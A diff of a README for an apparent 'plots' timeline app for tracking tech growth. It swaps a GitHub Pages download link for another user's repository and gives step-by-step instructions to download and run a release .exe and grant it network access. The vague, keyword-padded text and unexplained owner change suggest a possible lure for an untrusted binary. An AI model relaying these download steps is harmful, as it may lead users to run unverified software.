@@ -1,115 +1,67 @@
-# plots v2026 - data visualization 2026
+# 📈 plots-visual-growth-hub-2026 - Track tech progress with interactive timelines
 
-> **Interactive timelines for following tech progress and related growth patterns on Windows, macOS, and Linux, with the current focus on the 2026 release.**
+[![](https://img.shields.io/badge/Download-plots--visual--growth--hub--2026-blue)](https://github.com/omegawa1289/plots-visual-growth-hub-2026)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows%2C%20macOS%2C%20Linux-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/gabereed2002/plots-visual-growth-hub-2026?style=flat-square)](https://github.com/gabereed2002/plots-visual-growth-hub-2026)
+This application tracks technology growth patterns. It shows how specific tech fields develop over time. Users view data through an interactive timeline. This helps people see trends and milestones clearly. The tool focuses on the plots v2026 data set.
 
----
+## 💾 System Requirements
 
-<p align="center">
-  <a href="https://gabereed2002.github.io/plots-visual-growth-hub-2026/">
-    <img src="https://img.shields.io/badge/Download-plots%20Latest-brightgreen?style=for-the-badge" alt="Download plots">
-  </a>
-</p>
+Your computer must meet these standards to run the application:
 
-> **[Direct Download - plots v2026](https://gabereed2002.github.io/plots-visual-growth-hub-2026/)**
+*   Windows 10 or Windows 11.
+*   4 GB of system memory.
+*   500 MB of free storage space.
+*   A monitor with a resolution of 1280x720 or higher.
+*   An active internet connection for initial data updates.
 
----
+## 📥 How to Install the Software
 
-[Download Latest Build](https://gabereed2002.github.io/plots-visual-growth-hub-2026/)
+Follow these steps to set up the software on your Windows computer:
 
----
+1. Visit the [official download page](https://github.com/omegawa1289/plots-visual-growth-hub-2026).
+2. Look for the section labeled Releases on the right side of the page.
+3. Click the most recent version number.
+4. Scroll to the Assets section at the bottom of the release notes.
+5. Select the file ending in .exe to start your download.
+6. Find the file in your Downloads folder once the process finishes.
+7. Double-click the file to open the installation wizard.
+8. Follow the prompts on your screen to complete the setup.
+9. Click Finish to launch the application.
 
-## What plots is
+## 🖥️ Using the Application
 
-plots is a data visualization project centered on interactive timelines that help surface long-range growth patterns in a more readable way. It highlights subjects like AI growth, scaling laws, and energy efficiency, so progress over time can be reviewed side by side in a visual format.
+The main window displays your timeline. Each dot on the line represents a key moment or growth point. You use your mouse to interact with these points.
 
-This project is intended for users who want to study trends without relying on static charts or piecing together scattered sources. By combining a timeline-first layout with a straightforward interface, plots makes complex technical change easier to explore, compare, and present.
+*   **Move the view:** Click and drag the timeline background to see different dates.
+*   **Zoom in or out:** Use the scroll wheel on your mouse to focus on specific years or months.
+*   **View details:** Hover your mouse pointer over any circular point to see a pop-up window with text about that specific growth metric.
+*   **Search data:** Use the box at the top right of the screen to type keywords. The application filters the timeline to show only matching entries.
+*   **Switch views:** Use the menu on the left to toggle between yearly, monthly, and daily trends.
 
----
+## ⚙️ Settings and Customization
 
-## Key capabilities
+You can change how the software looks and handles data. Open the Settings menu by clicking the gear icon in the top right corner.
 
-- Interactive timelines for exploring visual data
-- Analysis of growth trends across technical topics
-- Timeline scaling controls for alternate views
-- Support for tracking AI growth and related progress
-- Emphasis on scaling laws and energy efficiency themes
-- Friendly interface for reviewing visual information
-- Works across Windows, macOS, and Linux
-- Designed for flexible data visualization workflows
+*   **Theme:** Switch between light mode and dark mode to suit your workspace.
+*   **Data Sources:** Choose which sectors of technology to include in your timeline. You can toggle specific industries on or off here.
+*   **Performance:** If the application runs slowly, reduce the level of animation detail in the display menu.
+*   **Auto-Update:** Keep this option enabled to ensure your timeline always includes the latest tech progress reports.
 
----
+## 🛠️ Troubleshooting Common Issues
 
-## Installation
+Check these common fixes if you encounter problems while running the application:
 
-You can clone the repository or download it, then open the project in the environment you prefer.
+*   **Application does not open:** Ensure you have the latest drivers for your graphics card. You can download these from your computer manufacturer’s website.
+*   **Timeline appears empty:** Verify your internet connection. The application requires access to the web to pull the latest 2026 data sets. Check your firewall settings to make sure the app has permission to connect to the network.
+*   **Screen looks blurry:** Adjust your Windows display scaling settings in the Control Panel. Set scaling to 100% for the best clarity.
+*   **Application freezes:** Close other programs that use significant memory. If the issue remains, restart your computer to clear the memory cache.
 
-Clone the repository:
-- `git clone https://github.com/gabereed2002/plots-visual-growth-hub-2026.git
-- `cd plots`
+## 🛡️ Privacy and Data
 
-From there, start the project with the workflow that matches your platform, or open the local build from the downloaded package if you are using the published release.
+This application stores data on your local hard drive. It saves your settings and your custom timeline views directly on your machine. The software uses your internet connection to fetch the latest growth data from the central repository. It does not monitor your private activity or track personal information unrelated to the tool.
 
----
+## 📋 Help and Support
 
-## How to use it
+If you run into issues not listed above, explore the documentation on our primary page. You can also view existing bug reports to see if others found a solution to your problem. We maintain a log of known issues to help users find quick answers. Make sure you use the latest version of the application before reporting a new problem.
 
-1. Open the application or the project entry point.
-2. Load or display a timeline dataset.
-3. Change the timeline scale to zoom in on shorter or longer growth windows.
-4. Compare shifts across AI growth, tech progress, and energy efficiency topics.
-5. Use the interface to inspect trends and tune the view for analysis or presentation.
-
-If you are using source code, follow the repository launch steps for your platform and run the app from the project directory.
-
----
-
-## Configuration
-
-What you can configure depends on the build you have. If settings are exposed, keep them with the application files or in the standard preferences location for your platform.
-
-Example configuration pattern:
-
-{
-  "timeline_scale": "auto",
-  "theme": "default",
-  "data_source": "local"
-}
-
-Set the available options to fit your dataset and the display style you want.
-
----
-
-## System requirements
-
-- Windows, macOS, or Linux
-- A compatible desktop runtime or browser-based environment, depending on the build
-- Space for local project files and any timeline data you plan to load
-- A modern system able to render interactive visual content
-
----
-
-## FAQ
-
-**How do I stay up to date?**  
-Use the release link above to get the latest build, and refresh your local copy whenever a new version is published.
-
-**Where are the settings saved?**  
-That depends on the package you are running. Check for a config file in the project folder or in the usual user preferences area for your platform.
-
-**What should I do if the interface does not open correctly?**  
-Make sure you are using the right build for your platform and that the required runtime or browser environment is available.
-
-**Is timeline scaling adjustable?**  
-Yes. Timeline scaling customization is part of the project and can be used to change how growth patterns are shown.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: timeline, visualization, technology, software, windows, trends, growth, 2026, data
